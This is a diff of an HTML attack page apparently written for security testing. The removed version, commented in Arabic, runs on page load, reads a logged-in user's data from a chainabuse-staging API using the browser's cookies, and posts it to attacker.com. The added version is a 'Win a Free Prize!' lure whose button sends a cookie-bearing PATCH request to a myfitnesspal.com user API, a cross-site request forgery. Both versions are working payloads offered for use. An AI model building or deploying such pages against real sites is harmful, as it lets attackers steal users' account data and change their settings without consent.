@@ -1,35 +1,29 @@
-<!-- attacker.com/cool-article -->
+<!DOCTYPE html>
 <html>
 <head>
-    <title>تحليل رائع!</title>
+    <title>Click Me!</title>
 </head>
 <body>
-    <h1>جاري تحميل التحليل...</h1>
+    <h1>Win a Free Prize!</h1>
+    <button onclick="sendRequest()">Click Here</button>
 
     <script>
-        // عندما تتحميل الصفحة، قم بتنفيذ الهجوم
-        window.onload = function() {
-            // أرسل طلباً إلى الـ API الحساسة في موقع chainabuse-staging
-            fetch('https://api.chainabuse-staging.com/v1/me', {
-                method: 'GET',
-                credentials: 'include' // هذا هو الجزء الحاسم! يخبر المتصفح بإرسال الكوكيز مع الطلب
-            })
-            .then(response => response.json())
-            .then(userData => {
-                // الآن المهاجم يمتلك بيانات المستخدم كاملة!
-                console.log("Data stolen:", userData);
-
-                // قم بإرسال البيانات المسروقة إلى خادم المهاجم
-                fetch('https://attacker.com/log-stolen-data', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(userData)
-                });
-            })
-            .catch(error => {
-                console.error("Attack failed:", error);
+        function sendRequest() {
+            fetch('https://www.myfitnesspal.com/api/services/users', {
+                method: 'PATCH',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    "item": {
+                        "location_preferences": {
+                            "time_zone": "America/New_York"
+                        }
+                    }
+                }),
+                credentials: 'include' // هذا مهم لإرسال الكوكيز مع الطلب
             });
-        };
+        }
     </script>
 </body>
 </html>
